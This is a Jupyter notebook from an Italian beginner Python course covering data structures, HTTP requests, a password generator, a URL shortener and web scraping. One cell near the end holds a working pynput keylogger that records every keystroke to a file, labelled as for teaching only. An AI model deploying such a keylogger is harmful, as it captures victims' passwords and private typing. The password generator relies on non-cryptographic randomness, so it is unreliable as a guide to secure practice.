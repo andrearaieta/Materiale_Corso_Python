{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "d54c384d-36c6-472b-9f43-9ea2954097f3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tuple"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#oltre le liste altre strutture dati che possiamo utilizzare tuple e i dizionari\n",
    "\n",
    "#una tupla è una serie di valori separati da virgola\n",
    "t = 1234,32,\"ciao!\"\n",
    "type(t)\n",
    "#tuple sono immutabili rispetto alle liste\n",
    "#t.append(23) #questo non può funzionare perchè non esiste la funzione associata e perchè sono oggetti immutabili\n",
    "#immutabili in programmazione che sono degli oggetti che non possono essere modificati, sono così per mantere i dati al suo interno in maniera costante.\n",
    "\n",
    "r = 255,0,0\n",
    "g = 0,255,0\n",
    "b = 0,0,255\n",
    "#se io per esempio ho bisogno di salvare un valore costante che non può cambiato come il nome di un file da usare sempre, che cosa faccio lo dichiaro come una costante\n",
    "t = (\"/home/file.txt\",)\n",
    "type(t)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "a4750f43-b594-48b4-a858-b8db7123294b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[1, 2, 3, 4, 5]"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#set è una struttura dati che permette di non avere duplicati all'interno\n",
    "set_numeri = {1,2,3,45} # ok perche non contiene duplicati\n",
    "set_numeri_2 = {1,1,2,4,5} #non ok perche ci sono due copie di 1\n",
    "#print(set_numeri_2) #automaticamente elimina tutto quello che è duplicato\n",
    "\n",
    "#per fare un esempio se noi abbiamo una lista come set_numeri_2 e non utilizziamo il set come struttura dati ma una lista, noi dobbiamo\n",
    "#fare un ciclo e eliminare i doppioni.\n",
    "#se per esempio la struttura dati di input è una lista con vari doppioni\n",
    "#lista_doppioni = [1,10,23,23,\"ciao\",\"prova\",\"test\",\"test\"]\n",
    "#se utilizziamo il cast(cambio di tipo list -> set) succede questo\n",
    "lista_pulita = set(lista_doppioni) #abbiamo un set pulito dai doppioni, sforzo zero e più veloce.\n",
    "\n",
    "#metodi della struttura dati set sono\n",
    "#lista_pulita.add(222) #aggiunge un elemento\n",
    "#lista_pulita.add(\"abc\")\n",
    "\n",
    "#metodo difference su due set\n",
    "set1 = {1,2,3,4,5}\n",
    "set2 = {4,5,6,7,8,9}\n",
    "#metodi classici sugli insiemi\n",
    "set1.difference(set2)\n",
    "set1.intersection(set2)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "40162485-dbe4-4bf3-907f-e87d352a2b98",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'apple', 'pear', 'peach', 'zeta'}\n"
     ]
    }
   ],
   "source": [
    "x = {\"apple\",\"zeta\",\"pear\",\"peach\",\"apple\"} #ricordatevi che il set ordina in ordine lessicografico\n",
    "y = {\"microsoft\",\"Google\",\"Intel\"}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "id": "e4d2e3fa-82a2-4427-a424-937012b100e0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "date ||| Fri, 14 Mar 2025 08:58:09 GMT\n",
      "server ||| mw-web.eqiad.main-7fd96bd568-njvtv\n",
      "x-content-type-options ||| nosniff\n",
      "content-language ||| de\n",
      "accept-ch ||| \n",
      "vary ||| Accept-Encoding,Cookie,Authorization\n",
      "last-modified ||| Fri, 14 Mar 2025 08:56:45 GMT\n",
      "content-type ||| text/html; charset=UTF-8\n",
      "content-encoding ||| gzip\n",
      "age ||| 968\n",
      "x-cache ||| cp6010 miss, cp6010 hit/10\n",
      "x-cache-status ||| hit-front\n",
      "server-timing ||| cache;desc=\"hit-front\", host;desc=\"cp6010\"\n",
      "strict-transport-security ||| max-age=106384710; includeSubDomains; preload\n",
      "report-to ||| { \"group\": \"wm_nel\", \"max_age\": 604800, \"endpoints\": [{ \"url\": \"https://intake-logging.wikimedia.org/v1/events?stream=w3c.reportingapi.network_error&schema_uri=/w3c/reportingapi/network_error/1.0.0\" }] }\n",
      "nel ||| { \"report_to\": \"wm_nel\", \"max_age\": 604800, \"failure_fraction\": 0.05, \"success_fraction\": 0.0}\n",
      "set-cookie ||| WMF-Last-Access=14-Mar-2025;Path=/;HttpOnly;secure;Expires=Tue, 15 Apr 2025 00:00:00 GMT, WMF-Last-Access-Global=14-Mar-2025;Path=/;Domain=.wikipedia.org;HttpOnly;secure;Expires=Tue, 15 Apr 2025 00:00:00 GMT, WMF-DP=d6d;Path=/;HttpOnly;secure;Expires=Fri, 14 Mar 2025 00:00:00 GMT, GeoIP=IT:62:Rome:41.89:12.51:v4; Path=/; secure; Domain=.wikipedia.org, NetworkProbeLimit=0.001;Path=/;Secure;SameSite=Lax;Max-Age=3600\n",
      "x-client-ip ||| 2a01:e11:34:40e0:1cc7:839d:661d:8e83\n",
      "cache-control ||| private, s-maxage=0, max-age=0, must-revalidate, no-transform\n",
      "accept-ranges ||| bytes\n",
      "content-length ||| 56260\n"
     ]
    }
   ],
   "source": [
    "#struttura dati dizionari\n",
    "#sono una struttura dati più complessa, se dobbiamo salvare in una variabile una rubrica telefonica, se noi utilizziamo una lista:\n",
    "#succede questo:\n",
    "#rubrica = [\"Marco\",\"Paolo\"]\n",
    "#telefoni = [\"7938021\",\"4784832\"]\n",
    "#for i in zip(rubrica,telefoni): # <--ricordarsi che se iterate su due liste esiste il metodo zip\n",
    "#    print(i)\n",
    "#anche una tupla potrebbe essere una soluzione ma senza avere la possibilità di usare una sorte di indice\n",
    "#[(\"Marco\",\"843189\"),(\"Paolo\",\"843214\")]\n",
    "#ci viene in aiuto in dizionario, in un dizionario i valori sono delle coppie key:value, quindi significa che la key è univoca.\n",
    "#per fare un esempio\n",
    "#se noi prendiamo come chiave Marco e come numero 843214 lo dichiariamo(scriviamo) nel seguente modo:\n",
    "\"\"\"\n",
    "rubrica = {\n",
    "    \"Marco\":843214,\n",
    "    \"Paolo\":238412,\n",
    "    \"Andrea\":19489321,\n",
    "    \"Marco\":1111111,\n",
    "    }\n",
    "\"\"\"\n",
    "#nel dizionario potete essere liberi di inserire i dati in più\n",
    "rubrica = {\n",
    "    \"SecureFutureGroup\": {\n",
    "        \"Nome\":\"Andrea\",\n",
    "        \"Cognome\":\"Raieta\",\n",
    "        \"Telefono\":3412984329,\n",
    "    },\n",
    "    \"Paolo\":238412,\n",
    "    \"Andrea\":19489321,\n",
    "    }\n",
    "\n",
    "#ovviamente per dire che si possono inserire piu dati in più forme si intende anche che io posso avere una chiave come intero o stringa.\n",
    "#e il suo valore che può qualsiasi cosa, dizionari, liste, tuple, set e cosi via.....\n",
    "negozio_vestiti = {\n",
    "    \"scarpe\":\n",
    "    {\n",
    "        \"nike\":{ \"taglia\":45,\"costo\":100.0,\"colore\":\"blue\"},\n",
    "    },\n",
    "    \"magliette\":[\"rosse\",\"blue\",\"verde\",\"giallo\"],\n",
    "    \"calzini\":{\"taglia\":33}\n",
    "}\n",
    "\n",
    "#come accediamo ai valori nel dizionario, utilizzando le chiavi, che significa prendere il nome della chiave e inserirla in questa sitassi\n",
    "#dizionario[nome_chiave]\n",
    "negozio_vestiti[\"scarpe\"]\n",
    "#se vogliamo accedere agli elementi interni della chiave scarpe ne aggiungiamo un altra dopo\n",
    "negozio_vestiti[\"scarpe\"][\"nike\"]\n",
    "#se voglio il colore delle nike scrivo\n",
    "negozio_vestiti[\"scarpe\"][\"nike\"][\"colore\"]\n",
    "\n",
    "#per verificare se una chiave è presente nel dizionario posso tranquillamente usare l'operatore in\n",
    "\"calzini\" in negozio_vestiti\n",
    "#se voglio sapere invece se la chiave costo è all'interno del dizionario diamo tutto il percorso finche dove si trova la chiave\n",
    "\"costo\" in negozio_vestiti[\"scarpe\"][\"nike\"]\n",
    "\n",
    "#può capitare di dover aggiungere delle nuove coppie key,value al dizionario, scriviamo semplicemente il nome della nuova chiave con l'elemento in questa maniera\n",
    "\"\"\"\n",
    "dizionario_vuoto = {}\n",
    "dizionario_vuoto[\"case\"] = {\"tipologia\":[\"trilocale\",\"famigliare\",\"bilocale\",\"quadrilocale\"]}\n",
    "dizionario_vuoto[\"case\"][\"metratura\"] = [100,250,32,24]\n",
    "dizionario_vuoto\n",
    "\"\"\"\n",
    "\n",
    " #se voglio eliminare un'elemento dal dizionario utilizzo del \n",
    "del negozio_vestiti[\"calzini\"]\n",
    "negozio_vestiti\n",
    "\n",
    "#metodi utili come keys e values\n",
    "#utilizzando il metodo keys di chiavi, se ci sono dizionari annidati come in negonegozio_vestiti otteniamo solo il primo livello\n",
    "negozio_vestiti.keys()\n",
    "#se vogliamo ottenere il secondo livello dobbiamo inserire la chiave appropriata che contiene il dizionario.\n",
    "\n",
    "#se invece vogliamo sapere tutti i values, tutti i valori associati ad una chiave o al dizionario stesso utilizziamo:\n",
    "negozio_vestiti.values()\n",
    "#values ci ritorna i valori come una lista, quindin significa che sono iterabili\n",
    "#per fare un altro esempio\n",
    "spesa_annua = {\n",
    "    \"luce\":[23,42,43,199,23,3,43],\n",
    "    \"acqua\":[43,54,12,43],\n",
    "}\n",
    "#permette di avere una lista di valori associata ad ogni chiave.\n",
    "\n",
    "#il metodo keys può essere utilizzato anche in contesti di confronti\n",
    "\"\"\"\n",
    "menu = {\"beer\":10,\"wine\":22,\"pizza\":2,\"spaghetti\":34,\"croissant\":11}\n",
    "if \"croissant\" in menu.keys():\n",
    "    print(\"Errore trovato nel menu inglese\")\n",
    "    del menu[\"croissant\"]\n",
    "\"\"\"\n",
    "\n",
    "#esempio reale\n",
    "import requests #la libreria requests per fare delle richieste verso degli url\n",
    "res = requests.get(\"https://de.wikipedia.org/wiki/Rangierbahnhof\")\n",
    "header = res.headers\n",
    "\n",
    "#faccio un analisi della risposta da wikipedia\n",
    "#voglio sapere le chiavi contenute all'interno del header di risposta\n",
    "#header.keys() #<-- se la stampo così è incomprensibile\n",
    "#se utilizzo un ciclo for\n",
    "def from_dict_to_pretty(dizionario):\n",
    "    for k,v in header.items():\n",
    "        print(f\"{k} ||| {v}\")\n",
    "\n",
    "from_dict_to_pretty(header)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "id": "548feaed-4bfe-4845-82df-336e0ae6a900",
   "metadata": {},
   "outputs": [],
   "source": [
    "#Esercizio liste\n",
    "#Data una lista di interi e stringhe [1,\"uno\",2,\"due\",\"quattro\",\"m\",23,43,1,\"case\"], scrivete una funzione che divide la lista in due liste\n",
    "#una che contiene solo gli interi e un che contiene solo le stringhe."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "id": "7597f891-04c2-4e5c-a5b3-2f9859d0a595",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'\\ndef stampa_triangolo(n):\\n    s =\"\"\\n    for i in range(n):\\n        s += \"*\"\\n        print(s, end=\\' f\\')\\n'"
      ]
     },
     "execution_count": 111,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Dato un carattere \"*\" voglio scrivere una funzione che tramite i print stampi un triangolo\n",
    "#se il carattere è asterisco e n=5\n",
    "\"\"\"\n",
    "*\n",
    "**\n",
    "***\n",
    "****\n",
    "*****\n",
    "\"\"\"\n",
    "\"\"\"\n",
    "def stampa_triangolo(n):\n",
    "    s =\"\"\n",
    "    for i in range(n):\n",
    "        s += \"*\"\n",
    "        print(s, end=' f')\n",
    "\"\"\"\n",
    "#stampa_triangolo(5)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 165,
   "id": "006b8557-0aae-4446-b172-85187164048c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Facebook': 'KewEl7%-(a0*m,Ptz&\\\\`IqNrQGFD6',\n",
       " 'Tik Tok': '`4zlw&Ca{6=:M\\\\HrO)x,Eng9T^v]b',\n",
       " 'Twitter': 'r%|\"vcb/1#T9hKlSU?w+`q>H{Ee:z',\n",
       " 'Instagram': 'k7=M\"-}Ip36)|2*^BF4;$zQRONb/X'}"
      ]
     },
     "execution_count": 165,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#generatore di password semplice\n",
    "#analisi: input lunghezza:int\n",
    "import string\n",
    "import random\n",
    "\n",
    "def genera_password(lunghezza):\n",
    "    #caratteri che vengono usate per comporre la password\n",
    "    caratteri = string.ascii_letters + string.digits + string.punctuation\n",
    "    #generare una password casualmente scegliendo tra i caratteri nella variabile\n",
    "    if lunghezza <= len(caratteri):\n",
    "        s = \"\"\n",
    "        contatore = 0\n",
    "        while(contatore < lunghezza):\n",
    "            #scegliere casualmente \n",
    "            carattere_generato = random.choice(caratteri)\n",
    "            if carattere_generato not in s:\n",
    "                s += carattere_generato\n",
    "                contatore += 1\n",
    "        return s\n",
    "    else:\n",
    "        return \"Valore non consentito!\"\n",
    "\n",
    "dizionario_db = {}\n",
    "lista = [\"Facebook\",\"Tik Tok\",\"Twitter\",\"Instagram\"]\n",
    "\n",
    "for social in lista:\n",
    "    dizionario_db[social]=genera_password(29)\n",
    "\n",
    "dizionario_db"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 158,
   "id": "6c645845-9beb-47ec-bcee-d7af002c8221",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'https://tinyservice.com/kY70Cn'"
      ]
     },
     "execution_count": 158,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#TinyURL\n",
    "#https://www.google.com/search?q=github&rlz=1C1GCEA_enIT1119IT1119&oq=&gs_lcrp=EgZjaHJvbWUqCQgGECMYJxjqAjIJCAAQIxgnGOoCMgkIARAjGCcY6gIyCQgCECMYJxjqAjIJCAMQIxgnGOoCMgkIBBAjGCcY6gIyCQgFECMYJxjqAjIJCAYQIxgnGOoCMgkIBxAjGCcY6gLSAQkxODE0NmowajeoAgiwAgHxBYKGRBX7PxlG&sourceid=chrome&ie=UTF-8\n",
    "#https://tinyurl.com/ssbwupph\n",
    "#analisi\n",
    "# rischio di collisione fra più tag\n",
    "# soluzione?\n",
    "tiny_db = {}\n",
    "#genera un tag per il nostro tinyurl(accetta ripetizioni)\n",
    "def genera_codice_unico():\n",
    "    caratteri = string.ascii_letters + string.digits\n",
    "    simbolo = \"\"\n",
    "    for c in range(6):\n",
    "        simbolo += random.choice(caratteri)\n",
    "    return simbolo\n",
    "\n",
    "def associa_url_tag(url):\n",
    "    tiny_db[genera_codice_unico()] = url\n",
    "\n",
    "def genera_urltiny(tag):\n",
    "    return f\"https://tinyservice.com/{tag}\"\n",
    "\n",
    "\n",
    "def recupera_url(url):\n",
    "    tag = url.split(\"/\")[-1]\n",
    "    return tiny_db[tag]\n",
    "#associa_url_tag(\"https://www.google.com/search?q=github&rlz=1C1GCEA_enIT1119IT1119&oq=&gs_lcrp=EgZjaHJvbWUqCQgGECMYJxjqAjIJCAAQIxgnGOoCMgkIARAjGCcY6gIyCQgCECMYJxjqAjIJCAMQIxgnGOoCMgkIBBAjGCcY6gIyCQgFECMYJxjqAjIJCAYQIxgnGOoCMgkIBxAjGCcY6gLSAQkxODE0NmowajeoAgiwAgHxBYKGRBX7PxlG&sourceid=chrome&ie=UTF-\")\n",
    "genera_urltiny(\"0xtPIW\")\n",
    "\n",
    "#caso reale\n",
    "#l'utente inserisce l'url per avere l'equivalente tiny url\n",
    "url_utente = \"https://www.google.com/search?q=github&rlz=1C1GCEA_enIT1119IT1119&oq=&g\"\n",
    "#chiamiamo la funzione genera_codice_unico()\n",
    "codice_unico = genera_codice_unico() #--> 0xtPIW\n",
    "#dopo aver generato il codice_unico dobbiamo salvarlo all'interno del nostro database\n",
    "#il nostro database è un dizionario e ci permette di controllare che non ci siano chiavi già esistenti\n",
    "#controllo che dobbiamo fare è verificare se il tag non è presente nel dizionario, in caso positivo lo aggiungiamo, in caso negativo ne creiamo un altro.\n",
    "while codice_unico in tiny_db:\n",
    "    #se il codice è presente ne generiamo un altro.\n",
    "    codice_unico = genera_codice_unico()\n",
    "\n",
    "#lo possiamo inserire all'interno del dizionario tiny_db\n",
    "tiny_db[codice_unico] = url_utente\n",
    "\n",
    "#costruiamo l'url tiny, chiamiamo il metodo genera_urltiny() per fornire il tinyurl all utente\n",
    "genera_urltiny(codice_unico)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 163,
   "id": "7babe76e-abef-4a33-8e2c-259e460038a7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'https://www.google.com/search?q=github&rlz=1C1GCEA_enIT1119IT1119&oq=&g'"
      ]
     },
     "execution_count": 163,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def recupera_url(url):\n",
    "    tag = url.split(\"/\")[-1]\n",
    "    return tiny_db[tag]\n",
    "    \n",
    "url = \"https://tinyservice.com/kY70Cn\"\n",
    "recupera_url(url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 195,
   "id": "91d9fec4-5dd0-45ac-9cfa-f9be570d543d",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Download Completato\n"
     ]
    }
   ],
   "source": [
    "#web scraping\n",
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "#facciamo il download della pagina target\n",
    "response = requests.get(\"https://www.scrapingcourse.com/ecommerce/\")\n",
    "\n",
    "#se lanciamo il comando\n",
    "#response.content\n",
    "soup = BeautifulSoup(response.content, \"html.parser\")\n",
    "\n",
    "#trovare un elemento nella pagina html che è contenuto in un tag con parametro class\n",
    "find_element = soup.find(attrs={\"class\":\"woocommerce-LoopProduct-link woocommerce-loop-product__link\"})\n",
    "#print(find_element)\n",
    "image_tag = find_element.find(\"img\")\n",
    "url_image =image_tag[\"src\"]\n",
    "\n",
    "#scaricare il pacchetto http contenente l'immagine\n",
    "res_image = requests.get(url_image)\n",
    "\n",
    "#scommentando questo vi potete accorgere che il Content-Type è image/jpeg inevec di html o altro.\n",
    "#fate caso che esiste anche la coppia Content-Length\n",
    "#for k,v in res_image.headers.items():\n",
    "#    print(k,v)\n",
    "\n",
    "#cotrollo per vedere se lo status code è 200 e quindi la risorsa(immagine)\n",
    "def download_image(url_image,nome):\n",
    "    res_image = requests.get(url_image)\n",
    "    if res_image.status_code == 200:\n",
    "        #andiamo a salvare l'immagine sul pc\n",
    "        with open(f\"{nome}\", \"wb\") as file:\n",
    "            file.write(res_image.content)\n",
    "        print(\"Download Completato\")\n",
    "    else:\n",
    "        print(\"Download non completato\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 210,
   "id": "14c89398-65de-4cc6-9a99-3de0ac983503",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Download in corso di mh09-blue_main.jpg\n",
      "Download Completato\n",
      "Download in corso di wj08-gray_main.jpg\n",
      "Download Completato\n",
      "Download in corso di wp07-black_main.jpg\n",
      "Download Completato\n",
      "Download in corso di ms01-blue_main.jpg\n",
      "Download Completato\n",
      "Download in corso di mp11-brown_main.jpg\n",
      "Download Completato\n",
      "Download in corso di ug06-lb-0.jpg\n",
      "Download Completato\n",
      "Download in corso di mg04-bk-0.jpg\n",
      "Download Completato\n",
      "Download in corso di mh12-green_main.jpg\n",
      "Download Completato\n",
      "Download in corso di wsh10-black_main.jpg\n",
      "Download Completato\n",
      "Download in corso di wsh06-gray_main.jpg\n",
      "Download Completato\n",
      "Download in corso di wt08-black_main.jpg\n",
      "Download Completato\n",
      "Download in corso di msh02-black_main.jpg\n",
      "Download Completato\n",
      "Download in corso di msh11-blue_main.jpg\n",
      "Download Completato\n",
      "Download in corso di mt07-gray_main.jpg\n",
      "Download Completato\n",
      "Download in corso di wh09-purple_main.jpg\n",
      "Download Completato\n",
      "Download in corso di wsh04-black_main.jpg\n",
      "Download Completato\n"
     ]
    }
   ],
   "source": [
    "#cotrollo per vedere se lo status code è 200 e quindi la risorsa(immagine)\n",
    "def download_image(url_image,nome):\n",
    "    res_image = requests.get(url_image)\n",
    "    if res_image.status_code == 200:\n",
    "        #andiamo a salvare l'immagine sul pc\n",
    "        with open(f\"{nome}\", \"wb\") as file:\n",
    "            file.write(res_image.content)\n",
    "        print(f\"Download in corso di {nome}\")\n",
    "        print(\"Download Completato\")\n",
    "    else:\n",
    "        print(\"Download non completato\")\n",
    "\n",
    "#web scraping\n",
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "#facciamo il download della pagina target\n",
    "response = requests.get(\"https://www.scrapingcourse.com/ecommerce/\")\n",
    "\n",
    "#se lanciamo il comando\n",
    "#response.content\n",
    "soup = BeautifulSoup(response.content, \"html.parser\")\n",
    "\n",
    "image_tag = soup.find_all(\"img\")\n",
    "for i_tag in image_tag:\n",
    "    nome_file_formato = i_tag[\"src\"].split(\"/\")[-1]\n",
    "    download_image(i_tag[\"src\"],nome_file_formato)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 202,
   "id": "ec187867-c17b-4b14-ba84-f0c6e71a9299",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'mh09-blue_main.jpg'"
      ]
     },
     "execution_count": 202,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#utilizzare su pc da terminale keylogger\n",
    "#installare con comando pip install pynpu\n",
    "#utilizzare solamente per scopo didattivo\n",
    "from pynput.keyboard import Key, Listener\n",
    "import logging\n",
    "\n",
    "log_dir =\"\"\n",
    "\"\"\"solo per scopo didattico....\"\"\"\n",
    "logging.basicConfig(filename=(log_dir+\"keylog.txt\"), level=logging.DEBUG, format='%(asctime)s: %(message)s')\n",
    "\n",
    "\n",
    "def on_press(key):\n",
    "    logging.info(str(key))\n",
    "    \n",
    "with Listener(on_press=on_press) as listener:\n",
    "    listener.join()\n",
    "    \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "83d2a08a-56c6-448c-8d91-6f388d97d6cc",
   "metadata": {},
   "outputs": [],
   "source": [
    "##utilizzare da terminale scanport\n",
    "#installare con comando pip install pynput\n",
    "#utilizzare solamente per scopo didattivo\n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
